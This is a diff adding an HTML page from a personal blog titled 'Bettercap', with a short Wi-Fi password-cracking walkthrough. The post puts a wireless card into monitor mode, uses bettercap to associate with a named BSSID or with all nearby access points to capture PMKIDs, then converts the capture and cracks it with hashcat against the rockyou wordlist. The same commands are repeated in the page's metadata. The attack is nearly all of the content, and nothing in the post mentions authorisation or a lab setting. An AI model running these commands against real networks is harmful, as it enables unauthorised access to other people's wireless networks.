@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="es">
+
+
+
+
+
+<head>
+  <meta property="og:url" content="https://imlauera.github.io/bettercap/">
+  <meta property="og:site_name" content="Imlauer">
+  <meta property="og:title" content="Bettercap">
+  <meta property="og:description" content="sudo su airmon-ng start wlan0 bettercap set wifi.interface wlan0mon wifi.recon on wifi.show We now need to associate with an access point using the BSSID. wifi.assoc 68:14:01:5a:0e:9c Similarly, if you want to capture PMKID of all the Access Points, wifi.assoc all We now need to convert this pcap file in Hashcat format and crack it as we did before, so: hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show">
+  <meta property="og:locale" content="es_es">
+  <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2025-02-16T23:14:38-03:00">
+    <meta property="article:modified_time" content="2025-02-16T23:14:38-03:00">
+    <meta property="article:tag" content="Wifi">
+
+  
+  <meta itemprop="name" content="Bettercap">
+  <meta itemprop="description" content="sudo su airmon-ng start wlan0 bettercap set wifi.interface wlan0mon wifi.recon on wifi.show We now need to associate with an access point using the BSSID. wifi.assoc 68:14:01:5a:0e:9c Similarly, if you want to capture PMKID of all the Access Points, wifi.assoc all We now need to convert this pcap file in Hashcat format and crack it as we did before, so: hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show">
+  <meta itemprop="datePublished" content="2025-02-16T23:14:38-03:00">
+  <meta itemprop="dateModified" content="2025-02-16T23:14:38-03:00">
+  <meta itemprop="wordCount" content="70">
+  <meta itemprop="keywords" content="Wifi">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Bettercap">
+  <meta name="twitter:description" content="sudo su airmon-ng start wlan0 bettercap set wifi.interface wlan0mon wifi.recon on wifi.show We now need to associate with an access point using the BSSID. wifi.assoc 68:14:01:5a:0e:9c Similarly, if you want to capture PMKID of all the Access Points, wifi.assoc all We now need to convert this pcap file in Hashcat format and crack it as we did before, so: hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show">
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>
+    
+    Bettercap
+    
+  </title>
+  <link rel="stylesheet" href='https://imlauera.github.io/css/site.min.css'>
+  <link rel="canonical" href="https://imlauera.github.io/bettercap/">
+  <link rel="alternate" type="application/rss&#43;xml" href="https://imlauera.github.io/index.xml" title="Imlauer">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="referrer" content="no-referrer">
+  <meta name="author" content="Imlauer.">
+  <meta name="description" content="sudo su
+airmon-ng start wlan0
+bettercap
+set wifi.interface wlan0mon
+wifi.recon on
+wifi.show
+We now need to associate with an access point using the BSSID. 
+wifi.assoc 68:14:01:5a:0e:9c
+Similarly, if you want to capture PMKID of all the Access Points, 
+wifi.assoc all
+We now need to convert this pcap file in Hashcat format and crack it as we did
+before, so: 
+hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap
+hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show
+">
+</head>
+<body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
+  <div class="navbar-brand">
+    <a class="navbar-item" href="https://imlauera.github.io/">
+      <figure class="image">
+        <img alt="" class="is-rounded" src="/img/memememe.jpg">
+      </figure>
+    </a>
+    <a class="navbar-item" href="https://imlauera.github.io/">
+      Imlauer
+    </a>
+    <a class="navbar-item" href="/acerca/">
+      Acerca de Mi
+    </a>
+  </div>
+  
+  
+</nav>
+
+  <section>
+    <section class='hero is-small is-link is-fullwidth'>
+      <div class="hero-body">
+<div class="container">
+  <h1 class="title">
+    Bettercap
+  </h1>
+  <h2 class="subtitle">
+    <time datetime='2025-02-16T23:14:38-03:00'>
+      February 16, 2025
+    </time>
+    
+    <br>
+    
+    
+    
+    <a class="tag is-info" href="https://imlauera.github.io/tags/wifi/">Wifi</a>
+    
+    
+    
+  </h2>
+</div>
+
+      </div>
+    </section>
+    <section class="section">
+      <div class="container">
+<div class="content is-medium">
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sudo su
+</span></span><span style="display:flex;"><span>airmon-ng start wlan0
+</span></span><span style="display:flex;"><span>bettercap
+</span></span><span style="display:flex;"><span>set wifi.interface wlan0mon
+</span></span><span style="display:flex;"><span>wifi.recon on
+</span></span><span style="display:flex;"><span>wifi.show
+</span></span></code></pre></div><p>We now need to associate with an access point using the BSSID. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>wifi.assoc 68:14:01:5a:0e:9c
+</span></span></code></pre></div><p>Similarly, if you want to capture PMKID of all the Access Points, </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>wifi.assoc all
+</span></span></code></pre></div><p>We now need to convert this pcap file in Hashcat format and crack it as we did
+before, so: </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap
+</span></span><span style="display:flex;"><span>hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show
+</span></span></code></pre></div>
+</div>
+
+
+      </div>
+    </section>
+  </section><script 
+src="/quiz/quizdown.js">
+</script>
+<script 
+src="/quiz/quizdownKatex.js">
+</script>
+<script 
+src="/quiz/quizdownHighlight.js">
+</script>
+<script>quizdown.register(quizdownHighlight).register(quizdownKatex).init()</script> 
+<footer class="footer">
+  <div class="content has-text-centered">
+    
+    
+    <p>
+      
+      <a class="" href="https://imlauera.github.io/index.xml" target="_blank">
+        <span>
+          RSS
+        </span>
+      </a>
+      
+      | <a href="https://imlauera.github.io" target="_blank">Andres Imlauer.</a> 
+
+      
+      
+    </p>
+    
+  </div>
+
+
+
+
+<script type="text/javascript"
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({ tex2jax: {inlineMath: [["$","$"],["\\(","\\)"]]} })
+</script>
+</footer>
+
+
+</body>
+</html>
